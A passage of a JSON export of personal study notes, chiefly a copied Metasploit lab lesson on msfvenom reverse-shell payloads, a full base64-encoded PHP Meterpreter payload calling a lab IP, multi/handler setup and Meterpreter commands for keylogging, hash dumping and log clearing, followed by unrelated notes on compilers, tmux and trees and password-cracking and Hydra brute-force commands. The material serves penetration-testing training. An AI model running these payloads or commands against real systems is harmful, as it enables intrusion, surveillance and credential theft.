aix/ppc/shell_find_port                             Spawn a shell on an established connection\n    aix/ppc/shell_interact                              Simply execve /bin/sh (for inetd programs)\n    aix/ppc/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\n    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP\n    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS\n    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager\n    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell\n    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell\n    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell\n    android/shell/reverse_http                          Spawn a piped command shell (sh). Tunnel communication over HTTP\n    android/shell/reverse_https                         Spawn a piped command shell (sh). Tunnel communication over HTTPS\n    android/shell/reverse_tcp                           Spawn a piped command shell (sh). Connect back stager\n    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)\n    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)\n    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)\n    apple_ios/aarch64/shell_reverse_tcp                 Connect back to attacker and spawn a command shell\n    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)\n    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)\n    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)\n        \n```\n\n### Output formats\nYou can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats\n\n### Encoders\nContrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.\n\nGenerating a PHP payload:\n\n```\n           root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nFound 1 compatible encoders\nAttempting to encode payload with 1 iterations of php/base64\nphp/base64 succeeded with size 1507 (iteration=0)\nphp/base64 chosen with final size 1507\nPayload size: 1507 bytes\neval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));\nroot@ip-10-10-186-44:~#\n        \n```\n  \n### Handlers\nSimilar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.\n\nThe following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;\n\n1.  Generate the PHP shell using MSFvenom\n2.  Start the Metasploit handler\n3.  Execute the PHP shell  \n    \n\nMSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of a Kali Linux machine used in the attack and local port 7777 was chosen.\n\nGenerating a PHP reverse shell\n\n```\n           root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw \u003e reverse_shell.php\n[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload\n[-] No arch selected, selecting arch: php from the payload\nNo encoder specified, outputting raw payload\nPayload size: 3020 bytes\nroot@ip-10-0-2-19:~#\n        \n```\n\nPlease note: The output PHP file will miss the starting PHP tag commented and the end tag (`?\u003e`), as seen below.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/d82319bb6e03f8fbd8d005da9c31e59d.png)  \n\nThe reverse\\_shell.php file should be edited to convert it into a working PHP file. \n\nBelow: Comments removed from the beginning of the file.\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/49c2132c9bd568cc3201bb38ed4ff7a0.png)  \n\nBelow: End tag added\n\n![](https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/ae579463375c5847a0b99d46f93c4142.png)  \n\nWe will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command.\n\nMulti handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.\n\nTo use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.\n\nSetting up the listener:\n\n```\n           msf6 \u003e use exploit/multi/handler \n[*] Using configured payload generic/shell_reverse_tcp\nmsf5 exploit(multi/handler) \u003e set payload php/reverse_php\npayload =\u003e php/reverse_php\nmsf5 exploit(multi/handler) \u003e set lhost 10.0.2.19\nlhost =\u003e 10.0.2.19\nmsf6 exploit(multi/handler) \u003e set lport 7777\nlport =\u003e 7777\nmsf6 exploit(multi/handler) \u003e show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (php/reverse_php):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.0.2.19        yes       The listen address (an interface may be specified)\n   LPORT  7777             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf6 exploit(multi/handler) \u003e\n        \n```\n\nOnce everything is set, we will `run` the handler and wait for the incoming connection.\n\nWaiting for the reverse shell:\n\n```\n           msf6 exploit(multi/handler) \u003e run\n\n[*] Started reverse TCP handler on 10.10.186.44:7777\n        \n```\n\nWhen the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell.\n\nIf the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.\n\n### Other Payloads\nBased on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:\n\nIn all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  \n  \nLinux Executable and Linkable Format (elf)  \n`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf \u003e rev_shell.elf`  \nThe .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  \n  \nWindows  \n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe \u003e rev_shell.exe`  \n  \nPHP  \n`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw \u003e rev_shell.php`  \n  \nASP  \n`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp \u003e rev_shell.asp`  \n  \nPython  \n`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw \u003e rev_shell.py`  \n  \nAll of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.\n\n## Meterpreter\nMeterpreter is a Metasploit payload that supports the penetration testing process with many valuable components. Meterpreter will run on the target system and act as an agent within a command and control architecture. You will interact with the target operating system and files and use Meterpreter's specialized commands.\n\nMeterpreter has many versions which will provide different functionalities based on the target system.\n\n**How does Meterpreter work?**\n\nMeterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target. This feature aims to avoid being detected during antivirus scans. By default, most antivirus software will scan new files on the disk (e.g. when you download a file from the internet) Meterpreter runs in memory (RAM - Random Access Memory) to avoid having a file that has to be written to the disk on the target system (e.g. meterpreter.exe). This way, Meterpreter will be seen as a process and not have a file on the target system.\n\nMeterpreter also aims to avoid being detected by network-based IPS (Intrusion Prevention System) and IDS (Intrusion Detection System) solutions by using encrypted communication with the server where Metasploit runs (typically your attacking machine). If the target organization does not decrypt and inspect encrypted traffic (e.g. HTTPS) coming to and going out of the local network, IPS and IDS solutions will not be able to detect its activities.  \n\nWhile Meterpreter is recognized by major antivirus software, this feature provides some degree of stealth.\n\nThe example below shows a target Windows machine exploited using the MS17-010 vulnerability. You will see Meterpreter is running with a process ID (PID) of 1304; this PID will be different in your case. We have used the `getpid` command, which returns the process ID with which Meterpreter is running. The process ID (or process identifier) is used by operating systems to identify running processes. All processes running in Linux or Windows will have a unique ID number; this number is used to interact with the process when the need arises (e.g. if it needs to be stopped).\n\nGetpid\n\n```\n           meterpreter \u003e getpid \nCurrent pid: 1304\n        \n```\n\nIf we list processes running on the target system using the `ps` command, we see PID 1304 is spoolsv.exe and not Meterpreter.exe, as one might expect.\n\nThe ps command\n\n```\n           meterpreter \u003e ps\n\nProcess List\n============\n\n PID   PPID  Name                  Arch  Session  User                          Path\n ---   ----  ----                  ----  -------  ----                          ----\n 0     0     [System Process]                                                   \n 4     0     System                x64   0                                      \n 396   644   LogonUI.exe           x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\LogonUI.exe\n 416   4     smss.exe              x64   0        NT AUTHORITY\\SYSTEM           \\SystemRoot\\System32\\smss.exe\n 428   692   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM           \n 548   540   csrss.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n 596   540   wininit.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\wininit.exe\n 604   588   csrss.exe             x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\csrss.exe\n 644   588   winlogon.exe          x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\winlogon.exe\n 692   596   services.exe          x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\services.exe\n 700   692   sppsvc.exe            x64   0        NT AUTHORITY\\NETWORK SERVICE  \n 716   596   lsass.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\cmd.exe\n 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\spoolsv.exe\n 1340  692   svchost.exe           x64   0        NT AUTHORITY\\LOCAL SERVICE    \n 1388  548   conhost.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\system32\\conhost.exe\n        \n```\n\nEven if we were to go a step further and look at DLLs (Dynamic-Link Libraries) used by the Meterpreter process (PID 1304 in this case), we still would not find anything jumping at us (e.g. no meterpreter.dll)\n\nThe Meterpreter process\n\n```\n           C:\\Windows\\system32\u003etasklist /m /fi \"pid eq 1304\"\ntasklist /m /fi \"pid eq 1304\"\n\nImage Name                     PID Modules                                     \n========================= ======== ============================================\nspoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    \n                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        \n                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  \n                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   \n                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      \n                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         \n                                   NSI.dll, IMM32.DLL, MSCTF.dll,              \n                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    \n                                   secur32.dll, SSPICLI.DLL, credssp.dll,      \n                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      \n                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     \n                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         \n                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         \n                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      \n                                   srvcli.dll, winspool.drv,                   \n                                   PrintIsolationProxy.dll, FXSMON.DLL,        \n                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       \n                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        \n                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       \n                                   webservices.dll, FirewallAPI.dll,           \n                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        \n                                   winprint.dll, USERENV.dll, profapi.dll,     \n                                   GPAPI.dll, dsrole.dll, win32spl.dll,        \n                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          \n                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        \n                                   cscapi.dll, netutils.dll, WININET.dll,      \n                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      \n                                   webio.dll, SHELL32.dll, MPR.dll,            \n                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        \n                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     \n                                   apphelp.dll, NLAapi.dll, napinsp.dll,       \n                                   pnrpnsp.dll, winrnr.dll                     \n\nC:\\Windows\\system32\u003e\n        \n```\n\nTyping help on any Meterpreter session (shown by meterpreter\u003e at the prompt) will list all available commands.\n\nThe Meterpreter help menu\n\n           \nmeterpreter \u003e help\n\nCore Commands\n=============\n\n    Command                   Description\n    -------                   -----------\n    ?                         Help menu\n    background                Backgrounds the current session\n    bg                        Alias for background\n    bgkill                    Kills a background meterpreter script\n    bglist                    Lists running background scripts\n    bgrun                     Executes a meterpreter script as a background thread\n    channel                   Displays information or control active channels\n    close                     Closes a channel[...]\n\n        \n\n\nEvery version of Meterpreter will have different command options, so running the help command is always a good idea. Commands are built-in tools available on Meterpreter. They will run on the target system without loading any additional script or executable files.\n\n\nMeterpreter will provide you with three primary categories of tools;\n\n    Built-in commands\n    Meterpreter tools\n    Meterpreter scripting\n\nIf you run the help command, you will see Meterpreter commands are listed under different categories.\n\n    Core commands\n    File system commands\n    Networking commands\n    System commands\n    User interface commands\n    Webcam commands\n    Audio output commands\n    Elevate commands\n    Password database commands\n    Timestomp commands\n\nPlease note that the list above was taken from the output of the help command on the Windows version of Meterpreter (windows/x64/meterpreter/reverse_tcp). These will be different for other Meterpreter versions.\n\nMeterpreter commands\nCore commands will be helpful to navigate and interact with the target system. Below are some of the most commonly used. Remember to check all available commands running the help command once a Meterpreter session has started.\n\n\nCore commands\n\n    background: Backgrounds the current session\n    exit: Terminate the Meterpreter session\n    guid: Get the session GUID (Globally Unique Identifier)\n    help: Displays the help menu\n    info: Displays information about a Post module\n    irb: Opens an interactive Ruby shell on the current session\n    load: Loads one or more Meterpreter extensions\n    migrate: Allows you to migrate Meterpreter to another process\n    run: Executes a Meterpreter script or Post module\n    sessions: Quickly switch to another session\n\nFile system commands\n\n    cd: Will change directory\n    ls: Will list files in the current directory (dir will also work)\n    pwd: Prints the current working directory\n    edit: will allow you to edit a file\n    cat: Will show the contents of a file to the screen\n    rm: Will delete the specified file\n    search: Will search for files\n    upload: Will upload a file or directory\n    download: Will download a file or directory\n\nNetworking commands\n\n    arp: Displays the host ARP (Address Resolution Protocol) cache\n    ifconfig: Displays network interfaces available on the target system\n    netstat: Displays the network connections\n    portfwd: Forwards a local port to a remote service\n    route: Allows you to view and modify the routing table\n\nSystem commands\n\n    clearev: Clears the event logs\n    execute: Executes a command\n    getpid: Shows the current process identifier\n    getuid: Shows the user that Meterpreter is running as\n    kill: Terminates a process\n    pkill: Terminates processes by name\n    ps: Lists running processes\n    reboot: Reboots the remote computer\n    shell: Drops into a system command shell\n    shutdown: Shuts down the remote computer\n    sysinfo: Gets information about the remote system, such as OS\n\nOthers Commands (these will be listed under different menu categories in the help menu)\n\n    idletime: Returns the number of seconds the remote user has been idle\n    keyscan_dump: Dumps the keystroke buffer\n    keyscan_start: Starts capturing keystrokes\n    keyscan_stop: Stops capturing keystrokes\n    screenshare: Allows you to watch the remote user's desktop in real time\n    screenshot: Grabs a screenshot of the interactive desktop\n    record_mic: Records audio from the default microphone for X seconds\n    webcam_chat: Starts a video chat\n    webcam_list: Lists webcams\n    webcam_snap: Takes a snapshot from the specified webcam\n    webcam_stream: Plays a video stream from the specified webcam\n    getsystem: Attempts to elevate your privilege to that of local system\n    hashdump: Dumps the contents of the SAM database\n\nAlthough all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment. ",
    "lastmodified": "2022-11-24T12:21:01.701387405Z",
    "tags": null
  },
  "/notes/general/three-address-code": {
    "title": "Three Address Code",
    "content": "# Three Address Code\n---\n[Parse trees](notes/general/parse-trees.md) are sometimes used in early stages of [compilers](notes/general/compilers.md).\n\n- They are **not** ideal for [optimisation](notes/general/compiler-optimisation.md).\n\nMain part of the compilers today use [](notes/general/instruction-set-semantics.md#^44cfb5%7Cthree%20address%20code):\n\n`result = operand1 operator operand2`\n\n## Example\nThe expression $a * b + a * b$ might be represented in TAC as:\n\n```assembly\nt1 := a  * b\nt2 := a  * b\nc  := t1 + t2\n```\n\n## Types\n- **Binary operators.**\n- **Unary operators** - one argument is ignored.\n- **Assignment** - one argument and operator is ignored.\n- **Unconditional jump** - result is label of a TAC instruction.\n- **Conditional jump** - variants for comparing arguments and jumping to result, or compare to generate `bool` followed by jump on a `bool`.\n- **Call and return** - one argument is the address, result is the return value.\n\n## Representation in C\n```c\nstruct tac {\n  int op;\n  struct tacarg arg1;\n  struct tacarg arg2;\n  struct tacarg res;\n}\n```\n\n```c\nstruct tacarg {\n  int disc;\n  union\n  {\n    int const;\n    struct symtab *name;\n    struct tac *label;\n  } data;\n}\n```\n\nRather than allocating each node in turn and linking them together, we can represent in a vector:\n```c\nstruct tac icode[1000];\n```\n\nThen have a function to generate a new node:\n```c\nvoid tacgen (int op, struct tacarg a, struct b, struct c) {\n  icode[pc].op = op;\n  icode[pc].arg1 = a;\n  icode[pc].arg2 = b;\n  icode[pc].res = c;\n  pc++;\n}\n```\n\n## Syntax Directed Translation\nRelated to [this](notes/general/syntax-directed-translation.md).\n\nasgmt $\\rightarrow$ var := expr\n                {tacgen(TAC_COPY, var.entry, NULL,\n                expr.place);}\n\n- The **entry** attribute would be the variable's symbol table entry.\n- The **place** attribute would be the location of the expression.\n    - Generated during the parsing of `expr`.\n    - Could be a variable, temporary variable or constant.",
    "lastmodified": "2022-11-24T12:21:01.726803899Z",
    "tags": null
  },
  "/notes/general/tmux-cheatsheet": {
    "title": "Tmux Cheatsheet",
    "content": "# Tmux Cheatsheet\n---\n**tmux** is a terminal multiplexer: it enables a number of terminals to be created, accessed, and controlled from a single screen.  **tmux** may be detached from a screen and continue running in the background, then later reattached.\n\n   When **tmux** is started, it creates a new session with a single window and displays it on screen.  A status line at the bottom of the screen shows information on the current session and is used to enter interactive commands.\n\n   A session is a single collection of pseudo terminals under the management of **tmux**.  Each session has one or more windows linked to it.  A window occupies the entire screen and may be split into rectangular panes, each of which is a separate pseudo terminal. Any number of **tmux** instances may connect to the same session, and any number of windows may be present in the same session.  Once all sessions are killed, **tmux** exits.\n\n   Each session is persistent and will survive accidental disconnection (such as ssh connection timeout) or intentional detaching (with the `C-t d` key strokes).  **tmux** may be reattached using:\n\n```bash\n $ tmux attach\n```\n\nIn **tmux**, a session is displayed on screen by a client and all sessions are managed by a single server. The server and each client are separate processes which communicate through a socket in `/tmp`.\n\n## Commands\n`tmux info` - Show every session, window, pane, etc...\n`tmux new -s mysession` - Start a session with the name _mysession_.\n`tmux ls` - List all sessions.\n`tmux a -t mysession` - Attach to _mysession_.\n`tmux kill-ses -t mysession` - Kill _mysession_.\n`tmux kill-session -a -t mysession` - Kill all but _mysession_.\n\n## Sessions\n| Shortcut         | Function               |\n| ---------------- | ---------------------- |\n| `Ctrl` + `t`     | Leader key.            |\n| `\u003cleader\u003e` + `$` | Rename session.        |\n| `\u003cleader\u003e` + `d` | Detach from session.   |\n| `\u003cleader` + `s`  | Show all sessions.     |\n\n## Windows\n| Shortcut         | Function               |\n| ---------------- | ---------------------- |\n| `\u003cleader\u003e` + `c` | Create window.         |\n| `\u003cleader\u003e` + `,` | Rename current window. |\n| `\u003cleader\u003e` + `\u0026` | Close current window.  |\n| `\u003cleader\u003e` + `n` | Next window.           |\n\n## Panes\n| Shortcut         | Function                  |\n| ---------------- | ------------------------- |\n| `\u003cleader\u003e` + `-` | Split pane horizontally.  |\n| `\u003cleader\u003e` + `\\` | Split pane vertically     |\n| `\u003cleader\u003e` + `{` | Move pane left.           |\n| `\u003cleader\u003e` + `}` | Move pane right.          |\n| `\u003cleader\u003e` + `!` | Convert pane into window. |\n| `\u003cleader\u003e` + `x` | Close current pane.       |\n\n## Other\n| Shortcut         | Function          |\n| ---------------- | ----------------- |\n| `\u003cleader\u003e` + `?` | List key bindings |",
    "lastmodified": "2022-11-24T12:21:01.752196312Z",
    "tags": null
  },
  "/notes/general/trees": {
    "title": "Trees",
    "content": "# Trees\n---\n[Abstract data type](https://en.wikipedia.org/wiki/Abstract_data_type \"Abstract data type\") that represents a hierarchical [tree structure](https://en.wikipedia.org/wiki/Tree_structure \"Tree structure\") with a set of connected [nodes](https://en.wikipedia.org/wiki/Node_(computer_science) \"Node (computer science)\"). Each node in the tree can be connected to many children (depending on the type of tree), but must be connected to exactly one parent, except for the _root_ node, which has no parent. \n\nThese constraints mean there are no cycles or \"loops\" (no node can be its own ancestor), and also that each child can be treated like the root node of its own subtree, making [recursion](https://en.wikipedia.org/wiki/Recursion \"Recursion\") a useful technique for tree traversal. In contrast to linear data structures, many trees cannot be represented by relationships between neigh-boring nodes in a single straight line.\n\n[Binary trees](notes/general/binary-trees.md) are a commonly used type, which constrain the number of children for each parent to exactly two. When the order of the children is specified, this data structure corresponds to an [ordered tree](https://en.wikipedia.org/wiki/Ordered_tree \"Ordered tree\") in graph theory. A value or pointer to other data may be associated with every node in the tree, or sometimes only with the _leaf nodes_, which have no children.\n\nThe abstract data type can be represented in a number of ways, including a list of parents with pointers to children, a list of children with pointers to parents, or a list of nodes and a separate list of parent-child relations (a specific type of [adjacency list](https://en.wikipedia.org/wiki/Adjacency_list \"Adjacency list\")). Representations might also be more complicated, for example using [indexes](https://en.wikipedia.org/wiki/Database_index \"Database index\") or ancestor lists for performance.\n\nSource: [Wikipedia](%3Chttps://en.wikipedia.org/wiki/Tree_(data_structure)\u003e)\n\n## Types of tree\n- [Binary Trees](notes/general/binary-trees.md)\n- [2-3 Trees](notes/general/2-3-trees.md)\n- [B-Trees](notes/general/b-trees.md)\n- [Binary Heap](notes/general/binary-heap.md)\n- [Parse Trees](notes/general/parse-trees.md)\n\n## See also\n- [Graphs](notes/general/graphs.md)\n- [Minimum Spanning Subtree](notes/general/minimum-spanning-tree.md)",
    "lastmodified": "2022-11-24T12:21:01.780228019Z",
    "tags": null
  },
  "/notes/general/turing-machines": {
    "title": "turing-machines",
    "content": "# Turing Machines\nTurning machine manipulate symbols on a strip of tape according to a table of rules and it is capable of implementing any computer algorithm.",
    "lastmodified": "2022-11-24T12:21:01.78589499Z",
    "tags": null
  },
  "/notes/general/useful-commands-dump": {
    "title": "Useful Commands Dump",
    "content": "# Useful Commands Dump\n---\nWell... where I dump any useful commands I find and them hopefully I'll categorise them... eventually...\n\n## Terminal\n* Change file extension of all files:\n```bash\nfor file in *.txt; do mv \"$file\" \"${file%.txt}.md\"; done\n```\n\n* If Git is hanging after total is because:\n```bash\ngit config --global http.postBuffer 157286400\n```\n\n- Run previous argument:\n\n```bash\n!$\n```\n\n## GDB\n| Command                      | Description                                                      |\n| ---------------------------- | ---------------------------------------------------------------- |\n| `gdb --args \u003cbinary\u003e \u003cargs\u003e` | Start the program with an argument list.                         |\n| `b FileName:linenum`         | For setting a breakpoint.                                        |\n| `bt`                         | For getting backtrace.                                           |\n| `thread apply all bt`        | For getting the backtrace of all threads.                        |\n| `p variableName`             | For printing the value of a variable/object.                     |\n| `up`                         | For going up the stack frame.                                    |\n| `down`                       | For going down the stack frame.                                  |\n| `l`                          | For listing source lines of code around the current stack frame. |\n| `disassemble`                | For showing the assembly code of the current function.           |\n| `n`                          | For executing the next source instruction.                       |\n| `si`                         | For executing the next machine instruction.                      |\n| `q`                          | To quit the debugger.                                            |\n| `r`                          | To run the program.                                              |\n\nThe docs are [here](https://www.gnu.org/software/gdb/documentation/).\nMore info on [GDB](notes/general/gdb.md).\n\n## The dump of dumps\n\n### BSC/Tiger related\n```bash\nruntest --tool=gcc --tool_exec=bsc-elf-clang  --tool_opts= --directory=${HOME}/tiger/gcc-for-llvm-testing/gcc/testsuite/gcc.target --srcdir=${HOME}/tiger/gcc-for-llvm-testing/gcc/testsuite --target_board=bsc-embdebug --target=bsc-elf \"bsc.exp=bsc/or.c\"\n```\n\n```bash\nexport PATH=${HOME}/riscv32-clang-gcc-testing/install/bin:$PATH\nexport BSC_TIMEOUT=300\nexport BSC_TRIPLE=bsc-elf\nexport BSC_SIM_COMMAND=bsc-run\nexport BSC_SIM_FLAGS=\nexport DEJAGNU=${HOME}/tiger/toolchain/site.exp\nexport TOOLDIR=${HOME}/tiger/toolchain/\n```\n\n```bash\nbsc-elf-gdb -ex 'target remote | embdebug --soname bsc --stdin' -ex 'break exit' -ex 'break abort' test2.exe\n```\n\n```bash\nllvm-objdump -d \u003ctestobject\u003e\n```\n\n```bash\nbsc-run --max-steps=200 --trace-inst --trace-regs --trace-stack ds.exe 2\u003e\u00261 | tee output.txt\n```\n\n```bash\npietraferreira@tom:~/insn-test-tiger$ bsc-elf-gdb -ex 'target remote | embdebug --soname bsc --stdin' -ex 'break exit' -ex 'break abort' sub.exe\n```\n\nAsk the front end to produce unoptimised LLVM IR:\n```bash\nbsc-elf-clang -Wall -O0 -S -emit-llvm --target=bsc 20180309-1.c -o 20180309-1.ll\n```\n\nCompile but stop at assembly:\n```bash\nllc --debug -mtriple=bsc 20180309-1.ll -o 20180309-1.s\n```\n\n```bash\nllvm-objdump -d sim-test.exe\n```\n\n```bash\nbsc-elf-gdb sim-test.exe -ex \"target remote | embdebug --soname sysc-bsc --vcd=trace-do --debug=0x00070000 --clk-mhz=1 --sim-cycles=10000 --stdin\" -ex load -ex c -ex detach -ex quit 2\u003e\u00261 | tee sim-test.log\n```\n\n## Website URL Fix\n```bash\ngrep -rl 'notes/images' . | sort | uniq | xargs perl -e \"s/assets/assets\\/engineer-training/\" -pi\n```\n\n## Hashcat\n```bash\nhashcat -m 1000 pass.txt ../Desktop/rockyou.txt\n```\n\n## Hydra\n```bash\nhydra -l admin -P ../Desktop/rockyou.txt 10.10.187.151 http-post-form 